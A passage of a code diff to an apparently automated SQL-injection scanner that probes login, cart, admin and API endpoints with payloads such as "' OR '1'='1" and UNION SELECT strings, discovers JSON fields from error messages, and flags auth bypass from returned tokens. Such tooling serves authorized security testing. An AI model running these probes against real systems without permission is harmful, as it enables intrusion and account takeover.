+                    if i == 0 and hasattr(self, "_ctx"):
+                        is_meaningful = self._ctx.is_meaningful_response(
+                            response.text,
+                            response.status_code,
+                            response.headers.get("content-type", ""),
+                            url,
+                        )
+                        # Check if this looks like an auth endpoint - DON'T skip these!
+                        # P0-FIX: Expanded patterns to catch more auth endpoints
+                        url_lower = url.lower()
+                        is_auth_endpoint = any(p in url_lower for p in [
+                            '/login', '/signin', '/sign-in', '/sign_in',
+                            '/auth', '/authenticate', '/authentication',
+                            '/session', '/sessions',
+                            '/token', '/tokens', '/oauth', '/oauth2',
+                            '/user/login', '/api/login', '/api/auth',
+                            '/rest/user', '/rest/auth', '/v1/auth', '/v2/auth',
+                            '/account/login', '/accounts/login',
+                            '/identity', '/sso', '/saml', '/cas',
+                            '/password', '/forgot', '/reset',
+                            '/register', '/signup', '/sign-up', '/sign_up',
+                            '/verify', '/confirm', '/activate',
+                        ])
+                        # Also check for common auth-related query params
+                        has_auth_params = any(p in url_lower for p in [
+                            'username=', 'user=', 'email=', 'password=',
+                            'credential', 'token=', 'code=', 'grant_type='
+                        ])
+                        # Check if response looks like JSON API (often auth endpoints)
+                        content_type = response.headers.get("content-type", "").lower()
+                        is_json_api = "application/json" in content_type
+
+                        # FP-FIX 2026-02-12: Check for SPA framework indicators
+                        # This catches Angular, React, Vue, etc. catch-all routes
+                        is_spa = _is_spa_response(
+                            content_type, response.text, len(response.text)
+                        )
+
+                        # P0-FIX: Only skip if definitely NOT auth-related
+                        should_skip = (
+                            (not is_meaningful or is_spa) and
+                            not is_auth_endpoint and
+                            not has_auth_params and
+                            not is_json_api
+                        )
+
+                        if should_skip:
+                            reason = "SPA framework detected" if is_spa else "not meaningful"
+                            logger.debug(f"[SQLi] Skipping {url} - {reason} (not auth)")
+                            return cluster, detector
+                        elif not is_meaningful and (is_auth_endpoint or has_auth_params or is_json_api):
+                            logger.info(f"[SQLi] Auth endpoint detected: {url} - continuing despite SPA-like response")
+
                     fp = ResponseFingerprint.from_response(response, elapsed)
                     cluster.add(fp)
                     detector.add_baseline(fp)
-                    
+
                     # Small delay between baseline requests
                     if i < self.baseline_samples - 1:
                         await asyncio.sleep(0.1)
-                        
+
                 except Exception as e:
                     logger.debug(f"Baseline request failed: {e}")
         
@@ -1338,7 +2401,7 @@ class SQLiScanner(ScanModule):
         test_payload = "' OR '1'='1"
         
         try:
-            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+            async with get_scan_client(timeout=self.timeout) as client:
                 # Test with obvious SQLi payload
                 response = await client.get(f"{url}?test={quote(test_payload)}")
                 waf_type, _ = WAFDetector.detect(response)
@@ -1380,71 +2443,254 @@ class SQLiScanner(ScanModule):
         host: str,
         endpoints: list[str],
     ) -> list[dict[str, Any]]:
-        """Identify JSON API endpoints that need POST testing."""
+        """Identify JSON API endpoints that need POST testing.
+
+        CRITICAL FIX: Expanded from 16 patterns to comprehensive coverage.
+        Previously missing: cart, checkout, order, comment, profile, admin, etc.
+        """
         json_endpoints = []
 
-        # Patterns for endpoints that typically accept JSON POST
+        # EXPANDED: Patterns for endpoints that typically accept JSON POST
+        # Each pattern has multiple template variations to handle different field names
         json_patterns = [
-            (r'/login', {"email": "test@test.com", "password": "test"}),
-            (r'/signin', {"email": "test@test.com", "password": "test"}),
-            (r'/register', {"email": "test@test.com", "password": "test", "passwordRepeat": "test"}),
-            (r'/signup', {"email": "test@test.com", "password": "test"}),
-            (r'/auth', {"email": "test@test.com", "password": "test"}),
-            (r'/user/login', {"email": "test@test.com", "password": "test"}),
-            (r'/user/register', {"email": "test@test.com", "password": "test"}),
-            (r'/api/login', {"username": "test", "password": "test"}),
-            (r'/api/auth', {"username": "test", "password": "test"}),
-            (r'/rest/user/login', {"email": "test@test.com", "password": "test"}),
-            (r'/rest/user/register', {"email": "test@test.com", "password": "test"}),
-            (r'/feedback', {"comment": "test", "rating": 5}),
-            (r'/Feedbacks', {"comment": "test", "rating": 5}),
-            (r'/api/Users', {"email": "test@test.com", "password": "test"}),
-            (r'/products/search', {"q": "test"}),
-            (r'/search', {"query": "test"}),
+            # Authentication (common variations)
+            (r'/login', [
+                {"email": "test@test.com", "password": "test"},
+                {"username": "test", "password": "test"},
+                {"user": "test", "pass": "test"},
+            ]),
+            (r'/signin', [{"email": "test@test.com", "password": "test"}]),
+            (r'/register', [
+                {"email": "test@test.com", "password": "test", "passwordRepeat": "test"},
+                {"username": "test", "email": "test@test.com", "password": "test"},
+            ]),
+            (r'/signup', [{"email": "test@test.com", "password": "test", "name": "test"}]),
+            (r'/auth', [{"email": "test@test.com", "password": "test"}]),
+
+            # User management
+            (r'/user', [{"email": "test@test.com", "password": "test", "name": "test"}]),
+            (r'/users', [{"email": "test@test.com", "password": "test"}]),
+            (r'/profile', [{"name": "test", "email": "test@test.com", "bio": "test"}]),
+            (r'/account', [{"email": "test@test.com", "name": "test"}]),
+
+            # E-commerce (CRITICAL - commonly missed)
+            (r'/cart', [{"productId": "1", "quantity": 1}, {"id": "1", "qty": 1}]),
+            (r'/basket', [{"ProductId": "1", "quantity": 1}, {"itemId": "1"}]),
+            (r'/checkout', [{"address": "test", "payment": "test"}]),
+            (r'/order', [{"items": [], "address": "test"}, {"productId": "1"}]),
+            (r'/orders', [{"userId": "1"}, {"status": "pending"}]),
+            (r'/payment', [{"amount": 100, "card": "test"}]),
+            (r'/coupon', [{"code": "TEST"}, {"couponCode": "TEST"}]),
+            (r'/discount', [{"code": "TEST"}]),
+
+            # Content/Comments (CRITICAL - commonly missed)
+            (r'/comment', [{"comment": "test", "postId": "1"}, {"text": "test", "id": "1"}]),
+            (r'/comments', [{"content": "test", "articleId": "1"}]),
+            (r'/review', [{"comment": "test", "rating": 5, "productId": "1"}]),
+            (r'/reviews', [{"text": "test", "rating": 5}]),
+            (r'/feedback', [{"comment": "test", "rating": 5}]),
+            (r'/post', [{"title": "test", "content": "test"}]),
+            (r'/posts', [{"title": "test", "body": "test"}]),
+            (r'/article', [{"title": "test", "content": "test"}]),
+            (r'/message', [{"to": "1", "text": "test"}, {"recipient": "1", "message": "test"}]),
+
+            # Search (multiple field names)
+            (r'/search', [{"q": "test"}, {"query": "test"}, {"search": "test"}, {"keyword": "test"}]),
+            (r'/products/search', [{"q": "test"}]),
+            (r'/find', [{"query": "test"}]),
+            (r'/filter', [{"filter": "test", "category": "test"}]),
+
+            # Admin endpoints (CRITICAL for privilege escalation)
+            (r'/admin', [{"username": "admin", "password": "test"}]),
+            (r'/administration', [{"user": "admin", "pass": "test"}]),
+            (r'/settings', [{"key": "test", "value": "test"}]),
+            (r'/config', [{"setting": "test", "value": "test"}]),
+
+            # API-specific patterns
+            (r'/api/v\d+/', [{"data": "test"}]),  # Versioned APIs
+            (r'/graphql', [{"query": "{ __schema { types { name } } }"}]),
+            (r'/rest/', [{"id": "1", "data": "test"}]),
+
+            # File/Upload related
+            (r'/upload', [{"filename": "test.txt"}]),
+            (r'/file', [{"path": "test"}]),
+
+            # Token/Session management
+            (r'/token', [{"grant_type": "password", "username": "test", "password": "test"}]),
+            (r'/refresh', [{"refresh_token": "test"}]),
+            (r'/verify', [{"token": "test"}]),
+
+            # Notifications
+            (r'/subscribe', [{"email": "test@test.com"}, {"endpoint": "test"}]),
+            (r'/notify', [{"message": "test", "userId": "1"}]),
+
+            # Support/Contact
+            (r'/contact', [{"email": "test@test.com", "message": "test"}]),
+            (r'/support', [{"subject": "test", "message": "test"}]),
+            (r'/ticket', [{"title": "test", "description": "test"}]),
         ]
 
-        base_url = f"https://{host}" if not host.startswith("http") else host
+        base_url = resolve_base_url(host)
 
         # Check endpoints from discovery
         for endpoint in endpoints:
-            for pattern, template in json_patterns:
+            for pattern, templates in json_patterns:
                 if re.search(pattern, endpoint, re.IGNORECASE):
+                    # Try first template (most common)
+                    template = templates[0] if templates else {"data": "test"}
                     json_endpoints.append({
                         "url": endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}",
                         "template": template,
+                        "template_alternatives": templates[1:] if len(templates) > 1 else [],
                         "pattern": pattern,
                     })
                     break
 
-        # Also probe common endpoints that might not be discovered
+        # EXPANDED: Also probe common endpoints that might not be discovered
+        # Auth endpoints get alternatives so baseline failure doesn't skip testing
+        _login_templates = [
+            {"email": "test@test.com", "password": "test"},
+            {"username": "test", "password": "test"},
+            {"user": "test", "pass": "test"},
+        ]
+        # FIX 2026-03-02: Reordered — search/content endpoints FIRST because
+        # they are highest-value SQLi targets (LIKE/WHERE clauses). Auth endpoints
+        # moved after search so time budget doesn't expire before reaching them.
         common_json_endpoints = [
-            ("/rest/user/login", {"email": "test@test.com", "password": "test"}),
-            ("/rest/user/register", {"email": "test@test.com", "password": "test", "passwordRepeat": "test"}),
-            ("/api/Users", {"email": "test@test.com", "password": "test"}),
-            ("/api/Feedbacks", {"comment": "test", "rating": 5}),
+            # Search/content — HIGHEST SQLi PROBABILITY (LIKE queries)
             ("/rest/products/search", {"q": "test"}),
+            ("/api/search", {"q": "test"}),
+            ("/api/products/search", {"query": "test"}),
+            # E-commerce — WHERE clauses
+            ("/api/orders", {"userId": "1"}),
+            ("/api/cart", {"productId": "1", "quantity": 1}),
+            ("/api/basket", {"ProductId": "1", "quantity": 1}),
+            ("/api/BasketItems", {"ProductId": "1", "quantity": 1}),
+            # Feedback/reviews
+            ("/api/feedbacks", {"comment": "test", "rating": 5}),
+            ("/api/Feedbacks", {"comment": "test", "rating": 5}),
+            ("/api/reviews", {"comment": "test", "rating": 5}),
+            # User management
+            ("/api/users", {"email": "test@test.com", "password": "test"}),
+            ("/api/user/profile", {"name": "test", "email": "test@test.com"}),
+            # Authentication endpoints (lower SQLi probability — hashed passwords)
+            ("/rest/user/login", {"email": "test@test.com", "password": "test"}),
+            ("/api/login", {"email": "test@test.com", "password": "test"}),
+            ("/api/auth/login", {"username": "test", "password": "test"}),
+            ("/api/v1/auth/login", {"email": "test@test.com", "password": "test"}),
+            ("/api/v1/login", {"email": "test@test.com", "password": "test"}),
+            ("/api/register", {"email": "test@test.com", "password": "test"}),
+            ("/api/checkout", {"address": "test"}),
+            # Comments
+            ("/api/comments", {"text": "test", "postId": "1"}),
+            # Admin
+            ("/api/admin/users", {"role": "admin"}),
+            ("/administration", {"user": "admin"}),
         ]
 
-        existing_paths = {urlparse(e["url"]).path for e in json_endpoints}
+        existing_paths = {urlparse(e["url"]).path.lower() for e in json_endpoints}
+        _auth_paths = {"login", "auth", "signin", "sign-in", "register", "signup"}
         for path, template in common_json_endpoints:
-            if path not in existing_paths:
-                json_endpoints.append({
+            if path.lower() not in existing_paths:
+                entry = {
                     "url": f"{base_url}{path}",
                     "template": template,
                     "pattern": path,
-                })
+                }
+                # Auth endpoints get alternative templates so baseline failure
+                # doesn't skip payload testing (different apps use different field names)
+                if any(a in path.lower() for a in _auth_paths):
+                    entry["template_alternatives"] = [
+                        t for t in _login_templates if t != template
+                    ]
+                json_endpoints.append(entry)
 
+        # NEW: Also test any endpoint that looks like an API (contains /api/ or /rest/)
+        # These might accept JSON POST even if not in our patterns
+        for endpoint in endpoints:
+            if not any(endpoint == e["url"] for e in json_endpoints):
+                if '/api/' in endpoint.lower() or '/rest/' in endpoint.lower():
+                    # Use generic template for unknown API endpoints
+                    json_endpoints.append({
+                        "url": endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}",
+                        "template": {"data": "test", "id": "1"},
+                        "pattern": "generic_api",
+                        "needs_field_discovery": True,  # Flag for dynamic discovery
+                    })
+
+        logger.debug(f"[SQLi] Identified {len(json_endpoints)} JSON endpoints for testing")
         return json_endpoints
+
+    async def _discover_json_fields(
+        self,
+        url: str,
+        client: Any,
+    ) -> dict[str, Any] | None:
+        """
+        DYNAMIC FIELD DISCOVERY: Probe endpoint to discover expected JSON fields.
+
+        Strategy:
+        1. Send empty JSON {} - error may reveal expected fields
+        2. Send invalid JSON - error may show schema
+        3. Try OPTIONS request for schema hints
+        """
+        discovered_fields = {}
+
+        try:
+            # Strategy 1: Send empty JSON and analyze error
+            resp = await client.post(url, json={}, headers={"Content-Type": "application/json"})
+            error_text = resp.text.lower()
+
+            # Common error patterns that reveal field names
+            field_patterns = [
+                r"'(\w+)' is required",
+                r'"(\w+)" is required',
+                r"missing (?:required )?(?:field|parameter)[:\s]+['\"]?(\w+)",
+                r"(\w+) (?:is )?required",
+                r"expecting[:\s]+['\"]?(\w+)",
+                r"parameter[:\s]+['\"]?(\w+)['\"]?\s+(?:is )?missing",
+                r'"(\w+)":\s*\[".*?required',  # JSON schema validation
+            ]
+
+            for pattern in field_patterns:
+                matches = re.findall(pattern, error_text, re.IGNORECASE)
+                for field in matches:
+                    if field not in discovered_fields and len(field) < 30:
+                        # Guess field type from name
+                        if 'email' in field.lower():
+                            discovered_fields[field] = "test@test.com"
+                        elif 'password' in field.lower() or 'pass' in field.lower():
+                            discovered_fields[field] = "test123"
+                        elif 'id' in field.lower():
+                            discovered_fields[field] = "1"
+                        elif any(x in field.lower() for x in ['quantity', 'qty', 'amount', 'count']):
+                            discovered_fields[field] = 1
+                        else:
+                            discovered_fields[field] = "test"
+
+            if discovered_fields:
+                logger.info(f"[SQLi] Dynamic field discovery found: {list(discovered_fields.keys())}")
+                return discovered_fields
+
+        except Exception as e:
+            logger.debug(f"[SQLi] Field discovery failed for {url}: {e}")
+
+        return None
 
     async def _test_json_endpoint_sqli(
         self,
         host: str,
         endpoint_info: dict[str, Any],
     ) -> list[dict[str, Any]]:
-        """Test JSON API endpoint for SQL injection."""
+        """Test JSON API endpoint for SQL injection.
+
+        ENHANCED: Now includes dynamic field discovery and alternative templates.
+        """
         findings = []
         url = endpoint_info["url"]
         template = endpoint_info["template"]
+        alternatives = endpoint_info.get("template_alternatives", [])
+        needs_discovery = endpoint_info.get("needs_field_discovery", False)
 
         # SQL injection payloads for JSON fields
         sqli_payloads = [
@@ -1466,8 +2712,17 @@ class SQLiScanner(ScanModule):
             ("' UNION SELECT 1,2,3--", "Union columns"),
         ]
 
-        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
+        async with get_scan_client(timeout=15.0) as client:
+            # NEW: Dynamic field discovery for unknown endpoints
+            if needs_discovery:
+                discovered = await self._discover_json_fields(url, client)
+                if discovered:
+                    template = discovered
+                    logger.debug(f"[SQLi] Using discovered fields for {url}: {list(template.keys())}")
+
             # First, get baseline response
+            baseline_status = None
+            baseline_len = 0
             try:
                 baseline_resp = await client.post(
                     url,
@@ -1476,13 +2731,75 @@ class SQLiScanner(ScanModule):
                 )
                 baseline_status = baseline_resp.status_code
                 baseline_len = len(baseline_resp.text)
-            except Exception as e:
-                logger.debug(f"[SQLi JSON] Baseline failed for {url}: {e}")
-                return findings
 
-            # Test each field in the template
+                # FIX 2026-03-02: Reject SPA shell responses.
+                # SPAs return 200 with HTML for ALL paths (including non-existent ones).
+                # A real JSON API endpoint returns application/json, not text/html.
+                ct = baseline_resp.headers.get("content-type", "").lower()
+                body_lower = baseline_resp.text[:500].lower()
+                # DIAG: Log baseline status for every JSON endpoint
+                logger.info(f"[SQLi JSON] {url}: POST baseline status={baseline_status}, ct={ct[:40]}, len={baseline_len}")
+                if baseline_status == 200 and (
+                    "text/html" in ct
+                    or ("<!doctype" in body_lower or "<html" in body_lower)
+                ) and "application/json" not in ct:
+                    logger.info(f"[SQLi JSON] {url}: SPA shell response (HTML), skipping")
+                    return findings
+            except Exception as e:
+                logger.info(f"[SQLi JSON] Primary baseline failed for {url}: {e}")
+                baseline_status = 500  # Treat exception as error to trigger alternatives
+
+            # FN-C6 FIX: If template fails, try ALL alternatives before giving up
+            if baseline_status is None or baseline_status >= 400:
+                found_working_template = False
+                if alternatives:
+                    for alt_template in alternatives:
+                        try:
+                            alt_resp = await client.post(
+                                url,
+                                json=alt_template,
+                                headers={"Content-Type": "application/json"},
+                            )
+                            if alt_resp.status_code < 400:
+                                template = alt_template
+                                baseline_status = alt_resp.status_code
+                                baseline_len = len(alt_resp.text)
+                                found_working_template = True
+                                logger.debug(f"[SQLi] Using alternative template for {url}")
+                                break
+                        except Exception:
+                            continue
+
+                # Only return if NO template worked via POST
+                if not found_working_template and baseline_status >= 400:
+                    # FIX 2026-03-02: Try GET with template fields as query params.
+                    # Many endpoints (e.g. /rest/products/search) are GET-only.
+                    # POST returns 500 but GET ?q=test works and is SQLi-vulnerable.
+                    get_query = urlencode(
+                        {k: v for k, v in template.items() if isinstance(v, (str, int, float))}
+                    )
+                    if get_query:
+                        get_url = f"{url}?{get_query}"
+                        try:
+                            get_resp = await client.get(get_url)
+                            if get_resp.status_code < 400:
+                                logger.info(f"[SQLi JSON] POST failed but GET works for {url}, switching to GET")
+                                baseline_status = get_resp.status_code
+                                baseline_len = len(get_resp.text)
+                                # Test payloads via GET query params
+                                return await self._test_json_endpoint_sqli_via_get(
+                                    url, template, sqli_payloads, baseline_status,
+                                    baseline_len, client,
+                                )
+                        except Exception:
+                            pass
+                    logger.debug(f"[SQLi] All methods (POST+GET) failed for {url}, skipping")
+                    return findings
+
+            # Test each field in the template via POST
             for field_name, field_value in template.items():
-                if not isinstance(field_value, str):
+                # Skip non-injectable types (lists, dicts) but test strings and numbers
+                if isinstance(field_value, (list, dict)):
                     continue
 
                 for payload, payload_type in sqli_payloads:
@@ -1516,13 +2833,19 @@ class SQLiScanner(ScanModule):
                                 break
 
                         # Response difference detection
+                        # FIX 2026-03-02: Was AND logic (status change + keyword).
+                        # Now: error status with keyword = vuln, OR large length diff with keyword = vuln.
                         if not is_vulnerable:
                             resp_len = len(resp.text)
-                            if resp.status_code != baseline_status or abs(resp_len - baseline_len) > 100:
-                                # Significant difference - needs more investigation
-                                if "error" in resp.text.lower() or "sql" in resp.text.lower():
-                                    is_vulnerable = True
-                                    evidence = f"Response anomaly with payload: {payload}"
+                            status_changed = resp.status_code != baseline_status
+                            length_changed = abs(resp_len - baseline_len) > 100
+                            has_error_kw = "error" in resp.text.lower() or "sql" in resp.text.lower()
+                            if status_changed and resp.status_code >= 400 and has_error_kw:
+                                is_vulnerable = True
+                                evidence = f"Error response (status {resp.status_code}) with payload: {payload}"
+                            elif length_changed and has_error_kw:
+                                is_vulnerable = True
+                                evidence = f"Response anomaly ({resp_len} vs {baseline_len} bytes) with payload: {payload}"
 
                         if is_vulnerable:
                             findings.append({
@@ -1548,12 +2871,114 @@ class SQLiScanner(ScanModule):
                                 "cwe": "CWE-89",
                                 "cvss": 9.8,
                             })
-                            # One finding per field is enough
-                            break
+                            # FN-C1 FIX: Removed break - test ALL payloads per field
+                            # Multiple SQLi types can exist in same field (error + time-based)
+                            # PERF-FIX 2026-02-20: But limit to MAX_FINDINGS_PER_PARAM to avoid bloat
+                            field_findings = [f for f in findings if f.get("metadata", {}).get("parameter") == field_name]
+                            if len(field_findings) >= MAX_FINDINGS_PER_PARAM:
+                                logger.debug(f"[SQLi] Early exit: {MAX_FINDINGS_PER_PARAM} findings for field {field_name}")
+                                break
 
                     except Exception as e:
                         logger.debug(f"[SQLi JSON] Error testing {field_name}: {e}")
                         continue
+
+        return findings
+
+    async def _test_json_endpoint_sqli_via_get(
+        self,
+        url: str,
+        template: dict[str, Any],
+        sqli_payloads: list[tuple[str, str]],
+        baseline_status: int,
+        baseline_len: int,
+        client: Any,
+    ) -> list[dict[str, Any]]:
+        """Test JSON API endpoint for SQLi using GET with query params.
+
+        FIX 2026-03-02: Fallback for endpoints where POST fails but GET works.
+        Example: JuiceShop /rest/products/search accepts GET ?q= but rejects POST.
+        """
+        findings: list[dict[str, Any]] = []
+
+        for field_name, field_value in template.items():
+            if isinstance(field_value, (list, dict)):
+                continue
+
+            for payload, payload_type in sqli_payloads:
+                test_params = {
+                    k: v for k, v in template.items()
+                    if isinstance(v, (str, int, float))
+                }
+                test_params[field_name] = payload
+                test_url = f"{url}?{urlencode(test_params)}"
+
+                try:
+                    resp = await client.get(test_url)
+
+                    is_vulnerable = False
+                    evidence = ""
+
+                    # Error-based detection (highest signal)
+                    for db_type, patterns in self.ERROR_PATTERNS.items():
+                        for pattern, _ in patterns:
+                            if re.search(pattern, resp.text, re.IGNORECASE):
+                                is_vulnerable = True
+                                evidence = f"SQL error ({db_type}): {pattern[:50]}"
+                                break
+                        if is_vulnerable:
+                            break
+
+                    # Auth bypass detection
+                    if not is_vulnerable and "token" in resp.text.lower() and "eyJ" in resp.text:
+                        is_vulnerable = True
+                        evidence = f"Auth bypass - JWT token returned with payload: {payload}"
+
+                    # Response difference detection (relaxed for GET)
+                    if not is_vulnerable:
+                        resp_len = len(resp.text)
+                        status_changed = resp.status_code != baseline_status
+                        length_changed = abs(resp_len - baseline_len) > 100
+                        has_error_keyword = "error" in resp.text.lower() or "sql" in resp.text.lower()
+                        # FIX: status change to error + significant length change = anomaly
+                        if status_changed and resp.status_code >= 400 and has_error_keyword:
+                            is_vulnerable = True
+                            evidence = f"Error response with payload (status {resp.status_code}): {payload}"
+                        elif length_changed and has_error_keyword:
+                            is_vulnerable = True
+                            evidence = f"Response anomaly with payload: {payload}"
+
+                    if is_vulnerable:
+                        findings.append({
+                            "type": "sql_injection",
+                            "severity": "critical",
+                            "title": f"SQL Injection in API - {field_name}",
+                            "name": f"SQL Injection in API - {field_name}",
+                            "description": f"SQL injection vulnerability found in parameter '{field_name}' at {url}",
+                            "evidence": evidence,
+                            "confidence": 95,
+                            "url": url,
+                            "method": "GET",
+                            "metadata": {
+                                "url": url,
+                                "parameter": field_name,
+                                "param_type": "query",
+                                "payload": payload,
+                                "payload_type": payload_type,
+                                "response_status": resp.status_code,
+                                "detection_method": "json_get_fallback",
+                            },
+                            "remediation": "Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.",
+                            "cwe": "CWE-89",
+                            "cvss": 9.8,
+                        })
+                        field_findings = [f for f in findings if f.get("metadata", {}).get("parameter") == field_name]
+                        if len(field_findings) >= MAX_FINDINGS_PER_PARAM:
+                            break
+
+                except Exception as e:
+                    logger.debug(f"[SQLi JSON GET] Error testing {field_name}: {e}")
+                    continue
 
         return findings
 
@@ -1564,9 +2989,71 @@ class SQLiScanner(ScanModule):
     ) -> list[dict[str, Any]]:
         """Test endpoint with God Mode precision."""
         findings = []
-        
+
         parsed = urlparse(endpoint)
         if not parsed.query:
+            # AUDIT-FIX 2026-02-11: Auto-inject test params for naked endpoints
+            # Discovery often returns /rest/products/search without ?q=
+            # We should inject common params based on endpoint patterns
+            path_lower = parsed.path.lower()
+
+            # PERF-FIX 2026-02-12: Skip auth endpoints - they're POST-only and don't accept GET params
+            # Testing these with injected params wastes time and causes timeouts
+            auth_patterns = ['login', 'signin', 'sign-in', 'register', 'signup', 'sign-up',
+                           'authenticate', 'auth/token', 'oauth', 'session']
+            if any(ap in path_lower for ap in auth_patterns):
+                logger.debug(f"[SQLi] Skipping param injection for auth endpoint: {endpoint}")
+                return findings
+
+            # FP-FIX 2026-02-12: Check for SPA BEFORE param injection
+            # SPAs return the same HTML for ANY path, causing false positives
+            # when we inject params like ?id=1 to arbitrary routes
+            try:
+                async with get_scan_client(timeout=self.timeout, http2=True) as client:
+                    response = await client.get(endpoint)
+                    content_type = response.headers.get("content-type", "")
+                    body = response.text
+                    body_length = len(body)
+
+                    if _is_spa_response(content_type, body, body_length):
+                        logger.debug(f"[SQLi] Skipping param injection for SPA endpoint: {endpoint}")
+                        return findings
+
+                    # FIX 2026-03-02: Skip if bare endpoint returns error.
+                    # Non-existent endpoints (e.g. /api/list on JuiceShop) return 4xx/5xx.
+                    # Injecting params into them wastes time — they don't exist.
+                    if response.status_code >= 400:
+                        logger.debug(f"[SQLi] Bare endpoint returns {response.status_code}, skipping param injection: {endpoint}")
+                        return findings
+            except Exception as e:
+                logger.debug(f"[SQLi] SPA check failed for {endpoint}: {e}")
+                # Continue anyway - maybe endpoint is down or rate limited
+
+            injected_params = []
+
+            if any(kw in path_lower for kw in ['search', 'find', 'query', 'filter']):
+                injected_params = ['q', 'query', 'search', 'term', 'keyword', 'filter']
+            elif any(kw in path_lower for kw in ['product', 'item', 'article']):
+                injected_params = ['id', 'product_id', 'item_id', 'sku']
+            elif any(kw in path_lower for kw in ['user', 'profile', 'account']):
+                injected_params = ['id', 'user_id', 'uid', 'email']
+            elif any(kw in path_lower for kw in ['order', 'basket', 'cart']):
+                injected_params = ['id', 'order_id', 'basket_id']
+            elif any(kw in path_lower for kw in ['comment', 'review', 'feedback']):
+                injected_params = ['id', 'comment_id', 'message']
+            else:
+                # Generic fallback for unknown endpoints
+                injected_params = ['id', 'q', 'name']
+
+            # Test with injected parameters
+            for param in injected_params[:3]:  # Test top 3 params
+                test_endpoint = f"{endpoint}?{param}=1"
+                logger.debug(f"[SQLi] Auto-injecting param: {test_endpoint}")
+                # Recursive call with injected param
+                param_findings = await self._test_endpoint_godmode(host, test_endpoint)
+                findings.extend(param_findings)
+                if findings:  # Found something, stop trying more params
+                    break
             return findings
         
         params = parse_qs(parsed.query)
@@ -1576,6 +3063,9 @@ class SQLiScanner(ScanModule):
         # Get baseline cluster
         cluster, detector = await self._get_baseline_cluster(baseline_url)
         if not cluster.fingerprints:
+            # FN-C6 FIX: Log and try simple error-based detection without baseline
+            logger.info(f"[SQLi] Baseline failed for {base_url}, trying error-based detection only")
+            findings.extend(await self._test_simple_error_based(endpoint, params))
             return findings
         
         # Detect WAF
@@ -1586,7 +3076,7 @@ class SQLiScanner(ScanModule):
             ctx = InjectionContext(
                 param_name=param_name,
                 param_type="query",
-                original_value=params[param_name][0] if params[param_name] else "",
+                original_value=(params.get(param_name) or [""])[0],
                 endpoint=endpoint,
                 detected_waf=waf_type,
             )
@@ -1604,7 +3094,7 @@ class SQLiScanner(ScanModule):
                 logger.info(f"🔎 Cross-validation result for {param_name}: {result}")
                 
                 if result:
-                    logger.info(f"  → is_vulnerable={result.is_vulnerable}, confidence={result.confidence}, MIN={self.MIN_CONFIDENCE}")
+                    logger.info(f"  → is_vulnerable={result.is_vulnerable}, confidence_score={result.confidence}, MIN={self.MIN_CONFIDENCE}")
                     if result.is_vulnerable and result.confidence >= self.MIN_CONFIDENCE:
                         logger.info(f"  ✅ Adding finding for {param_name}!")
                         findings.append(self._create_finding(result))
@@ -1614,9 +3104,236 @@ class SQLiScanner(ScanModule):
                     logger.info(f"  ❌ No result returned for {param_name}")
             except Exception as e:
                 logger.error(f"💥 Exception in cross_validate_sqli for {param_name}: {e}", exc_info=True)
-        
+
         return findings
-    
+
+    # =========================================================================
+    # PATH PARAMETER TESTING (2026-02-12) - Tests /api/users/123 style params
+    # =========================================================================
+
+    def _extract_path_params(self, url: str) -> list[dict[str, Any]]:
+        """
+        Extract potential injectable path parameters from URL.
+
+        Identifies:
+        - Numeric IDs: /users/123, /products/42
+        - UUIDs: /items/550e8400-e29b-41d4-a716-446655440000
+        - Slugs with numbers: /post/my-article-123
+        - Hex IDs: /data/a1b2c3d4
+        """
+        parsed = urlparse(url)
+        path_segments = [s for s in parsed.path.split('/') if s]
+
+        path_params: list[dict[str, Any]] = []
+
+        for i, segment in enumerate(path_segments):
+            param_info = None
+
+            # Numeric ID (most common): /users/123
+            if segment.isdigit():
+                param_info = {
+                    "index": i,
+                    "original": segment,
+                    "type": "numeric_id",
+                    "segment": segment,
+                }
+            # UUID: /items/550e8400-e29b-41d4-a716-446655440000
+            elif re.match(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', segment, re.I):
+                param_info = {
+                    "index": i,
+                    "original": segment,
+                    "type": "uuid",
+                    "segment": segment,
+                }
+            # Short UUID / MongoDB ObjectID: /data/507f1f77bcf86cd799439011
+            elif re.match(r'^[a-f0-9]{24}$', segment, re.I):
+                param_info = {
+                    "index": i,
+                    "original": segment,
+                    "type": "objectid",
+                    "segment": segment,
+                }
+            # Hex ID: /data/a1b2c3d4 (8-16 chars hex)
+            elif re.match(r'^[a-f0-9]{8,16}$', segment, re.I) and not segment.isdigit():
+                param_info = {
+                    "index": i,
+                    "original": segment,
+                    "type": "hex_id",
+                    "segment": segment,
+                }
+            # Slug with trailing number: /post/my-article-123
+            elif re.match(r'^[\w-]+-\d+$', segment):
+                param_info = {
+                    "index": i,
+                    "original": segment,
+                    "type": "slug_numeric",
+                    "segment": segment,
+                }
+
+            if param_info:
+                path_params.append(param_info)
+
+        return path_params
+
+    async def _test_path_param_sqli(
+        self,
+        host: str,
+        endpoint: str,
+    ) -> list[dict[str, Any]]:
+        """
+        Test SQL injection in path parameters.
+
+        E.g., /api/users/123 → /api/users/123' or /api/users/1 OR 1=1--
+        """
+        findings: list[dict[str, Any]] = []
+
+        path_params = self._extract_path_params(endpoint)
+        if not path_params:
+            return findings
+
+        parsed = urlparse(endpoint)
+        path_segments = parsed.path.split('/')
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        logger.info(f"[SQLi] Testing {len(path_params)} path parameters in {endpoint}")
+
+        # Path injection payloads - designed to trigger SQL errors
+        path_payloads = [
+            # Error-based
+            ("'", "single_quote"),
+            ("''", "double_quote"),
+            ("1'", "numeric_quote"),
+            ("-1", "negative"),
+            ("0", "zero"),
+            ("999999999", "large_number"),
+            # Boolean-based
+            ("1 OR 1=1", "or_true"),
+            ("1 AND 1=1", "and_true"),
+            ("1 AND 1=2", "and_false"),
+            # Comment injection
+            ("1--", "comment_dash"),
+            ("1#", "comment_hash"),
+            ("1/**/", "comment_block"),
+            # Union-based (for numeric IDs)
+            ("1 UNION SELECT NULL", "union_null"),
+            ("0 UNION SELECT 1", "union_select"),
+            # Special characters that cause errors
+            (";", "semicolon"),
+            ("\\", "backslash"),
+        ]
+
+        for param_info in path_params:
+            original_value = param_info["original"]
+            param_index = param_info["index"]
+            param_type = param_info["type"]
+
+            # Get baseline response
+            try:
